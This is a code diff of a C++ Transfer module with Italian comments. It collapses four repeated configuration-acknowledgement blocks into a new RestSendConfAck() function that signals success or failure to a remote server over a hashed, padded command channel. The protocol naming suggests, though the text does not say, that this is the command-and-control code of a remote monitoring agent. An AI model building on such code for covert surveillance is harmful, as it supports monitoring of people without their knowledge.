@@ -1660,7 +1660,7 @@ BOOL Transfer::RestGetNewConf() {
 	Hash hash;
 
 	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + 20);
-	UINT uCommand = PROTO_NEW_CONF, uConfOK;
+	UINT uCommand = PROTO_NEW_CONF;
 	BYTE sha1[20];
 
 	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);
@@ -1710,28 +1710,7 @@ BOOL Transfer::RestGetNewConf() {
 	hBackup = CreateFile(strBackName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (hBackup == INVALID_HANDLE_VALUE) {
-		uConfOK = PROTO_NO;
-		uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(PROTO_NO) + 20);
-		hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);
-
-		// Creiamo il request per il comando
-		b.free();
-		b.append((UCHAR *)&uCommand, sizeof(uCommand));
-		b.append((UCHAR *)&uConfOK, sizeof(uCommand));
-		b.append((BYTE *)sha1, 20);
-		b.repeat(uPadding, uPadding);
-
-		UINT uResponse = 0;
-		BYTE *pResponse = NULL;
-
-		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
-
-		if (pResponse == NULL) {
-			DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
-			return FALSE;
-		}
-
-		delete[] pResponse;
+		RestSendConfAck(FALSE);
 		return FALSE;
 	}
 
@@ -1740,30 +1719,7 @@ BOOL Transfer::RestGetNewConf() {
 		DeleteFile(GetCurrentPathStr(strBackName).c_str());
 		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [Cannot write new conf] ", 4, TRUE);
 
-		// Nuova conf non valida
-		uConfOK = PROTO_NO;
-		uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(PROTO_NO) + 20);
-		hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);
-
-		// Creiamo il request per il comando
-		b.free();
-		b.append((UCHAR *)&uCommand, sizeof(uCommand));
-		b.append((UCHAR *)&uConfOK, sizeof(uCommand));
-		b.append((BYTE *)sha1, 20);
-		b.repeat(uPadding, uPadding);
-
-		UINT uResponse = 0;
-		BYTE *pResponse = NULL;
-
-		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
-
-		if (pResponse == NULL) {
-			DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
-			return FALSE;
-		}
-
-		delete[] pResponse;
-
+		RestSendConfAck(FALSE);
 		return FALSE;
 	}
 
@@ -1774,30 +1730,7 @@ BOOL Transfer::RestGetNewConf() {
 		DeleteFile(GetCurrentPathStr(strBackName).c_str());
 		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [Cannot completely write new conf] ", 4, TRUE);
 
-		// Nuova conf non valida
-		uConfOK = PROTO_NO;
-		uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(PROTO_NO) + 20);
-		hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);
-
-		// Creiamo il request per il comando
-		b.free();
-		b.append((UCHAR *)&uCommand, sizeof(uCommand));
-		b.append((UCHAR *)&uConfOK, sizeof(uCommand));
-		b.append((BYTE *)sha1, 20);
-		b.repeat(uPadding, uPadding);
-
-		UINT uResponse = 0;
-		BYTE *pResponse = NULL;
-
-		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
-
-		if (pResponse == NULL) {
-			DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
-			return FALSE;
-		}
-
-		delete[] pResponse;
-
+		RestSendConfAck(FALSE);
 		return FALSE;
 	}
 
@@ -1815,29 +1748,7 @@ BOOL Transfer::RestGetNewConf() {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [Invalid new conf, deleting it] ", 4, TRUE);
 
 		// Nuova conf non valida
-		uConfOK = PROTO_NO;
-		uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(PROTO_NO) + 20);
-		hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);
-
-		// Creiamo il request per il comando
-		b.free();
-		b.append((UCHAR *)&uCommand, sizeof(uCommand));
-		b.append((UCHAR *)&uConfOK, sizeof(uCommand));
-		b.append((BYTE *)sha1, 20);
-		b.repeat(uPadding, uPadding);
-
-		UINT uResponse = 0;
-		BYTE *pResponse = NULL;
-
-		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
-
-		if (pResponse == NULL) {
-			DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
-			return FALSE;
-		}
-
-		delete[] pResponse;
-
+		RestSendConfAck(FALSE);
 		return FALSE;
 	}
 
@@ -1848,24 +1759,38 @@ BOOL Transfer::RestGetNewConf() {
 	logInfo.WriteLogInfo(L"New configuration received");
 
 	// Torniamo un OK per la nuova configurazione
-	uConfOK = PROTO_OK;
-	uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(PROTO_OK) + 20);
-	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);
+	RestSendConfAck(TRUE);
+	return TRUE;
+}
+
+BOOL Transfer::RestSendConfAck(BOOL bConfOK) {
+	Hash hash;
+	BYTE sha1[20];
+	UINT uConfOK, uCommand = PROTO_NEW_CONF;
+	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(uConfOK) + 20);
+	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_NEW_CONF) + sizeof(uConfOK) + 20));
+
+	if (bConfOK == TRUE) 
+		uConfOK = PROTO_OK;
+	else
+		uConfOK = PROTO_NO;
 
 	// Creiamo il request per il comando
-	b.free();
 	b.append((UCHAR *)&uCommand, sizeof(uCommand));
-	b.append((UCHAR *)&uConfOK, sizeof(uCommand));
+	b.append((UCHAR *)&uConfOK, sizeof(uConfOK));
+
+	hash.Sha1(b.getBuf(), sizeof(uCommand) + sizeof(uConfOK), sha1);
+
 	b.append((BYTE *)sha1, 20);
 	b.repeat(uPadding, uPadding);
 
-	uResponse = 0;
-	pResponse = NULL;
+	UINT uResponse = 0;
+	BYTE *pResponse = NULL;
 
 	pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
 
 	if (pResponse == NULL) {
-		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
+		DBG_TRACE(L"Debug - Transfer.cpp - RestSendConfAck() FAILED [RestSendCommand()] ", 4, TRUE);
 		return FALSE;
 	}
 
